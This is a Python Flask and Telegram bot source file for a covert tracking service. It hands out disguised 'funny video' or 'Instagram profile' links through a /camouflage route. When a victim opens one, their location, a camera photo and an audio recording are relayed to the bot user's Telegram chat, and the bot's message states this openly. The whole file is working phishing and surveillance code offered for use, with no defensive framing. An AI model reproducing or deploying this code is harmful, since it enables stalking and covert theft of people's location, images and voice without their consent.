import os
import json
import base64
import tempfile
import requests
from flask import Flask, request, render_template, jsonify
from telegram import Update
from database import create_session, get_chat_id

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise Exception("BOT_TOKEN missing")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ---------- Helper: Send Telegram message ----------
def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(f"{TG_API}/sendMessage", json=payload)

def answer_callback(callback_query_id, text=None):
    payload = {"callback_query_id": callback_query_id}
    if text:
        payload["text"] = text
    requests.post(f"{TG_API}/answerCallbackQuery", json=payload)

def edit_message_text(chat_id, message_id, text):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text
    }
    requests.post(f"{TG_API}/editMessageText", json=payload)

def send_photo(chat_id, photo_path):
    with open(photo_path, "rb") as f:
        requests.post(f"{TG_API}/sendPhoto", data={"chat_id": chat_id}, files={"photo": f})

def send_audio(chat_id, audio_path):
    with open(audio_path, "rb") as f:
        requests.post(f"{TG_API}/sendAudio", data={"chat_id": chat_id}, files={"audio": f})

def send_to_telegram(chat_id, data_type, content):
    if data_type == "location":
        lat = content["lat"]
        lon = content["lon"]
        acc = content["acc"]
        send_message(chat_id, f"📍 Location: {lat}, {lon}\nAccuracy: {acc}m")
    elif data_type == "photo":
        header, encoded = content.split(",", 1)
        img_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            f.write(img_data)
            tmp = f.name
        send_photo(chat_id, tmp)
        os.unlink(tmp)
    elif data_type == "audio":
        header, encoded = content.split(",", 1)
        audio_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as f:
            f.write(audio_data)
            tmp = f.name
        send_audio(chat_id, tmp)
        os.unlink(tmp)

# ---------- Flask Routes ----------
@app.route('/camouflage')
def camouflage():
    session_id = request.args.get('session')
    template = request.args.get('template', 'funny')
    if not session_id or not get_chat_id(session_id):
        return "Invalid or expired link", 404
    if template not in ['funny', 'instagram']:
        template = 'funny'
    return render_template(f'{template}.html')

@app.route('/track', methods=['POST'])
def track():
    session_id = request.args.get('session')
    chat_id = get_chat_id(session_id)
    if not chat_id:
        return jsonify({"error": "Invalid session"}), 400
    data = request.get_json()
    path = request.path
    if '/location' in path:
        send_to_telegram(chat_id, "location", data)
    elif '/photo' in path:
        send_to_telegram(chat_id, "photo", data.get("image"))
    elif '/audio' in path:
        send_to_telegram(chat_id, "audio", data.get("audio"))
    return jsonify({"status": "ok"})

# ---------- Telegram Webhook Handler (Synchronous) ----------
@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data(as_text=True)
    try:
        update = Update.de_json(json.loads(json_str), None)
        
        # Handle /start command
        if update.message and update.message.text and update.message.text.startswith('/start'):
            chat_id = update.message.chat.id
            keyboard = {
                "inline_keyboard": [
                    [{"text": "😂 Funny Video Link", "callback_data": "funny"}],
                    [{"text": "📸 Instagram Profile Link", "callback_data": "instagram"}]
                ]
            }
            send_message(chat_id, "🔗 Kaunsa link chahiye? Choose one:", reply_markup=keyboard)
        
        # Handle callback query (button click)
        elif update.callback_query:
            query = update.callback_query
            query_id = query.id
            chat_id = query.message.chat.id
            message_id = query.message.message_id
            template = query.data  # "funny" or "instagram"
            
            # Answer callback to remove loading state
            answer_callback(query_id)
            
            # Generate link
            session_id = create_session(chat_id)
            public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")
            link = f"{public_url}/camouflage?session={session_id}&template={template}"
            
            # Edit original message to show link
            edit_message_text(chat_id, message_id, f"✅ Your {template} link is ready:\n{link}\n\nShare this link. When opened, location, photo & audio will be sent here.")
        
        return "ok"
    except Exception as e:
        print(f"Webhook error: {e}")
        return "error", 500

# ---------- Set Webhook ----------
def set_webhook():
    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")
    webhook_url = f"{public_url}/webhook"
    r = requests.post(f"{TG_API}/setWebhook", json={"url": webhook_url})
    print(f"Webhook set: {r.text}")

set_webhook()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
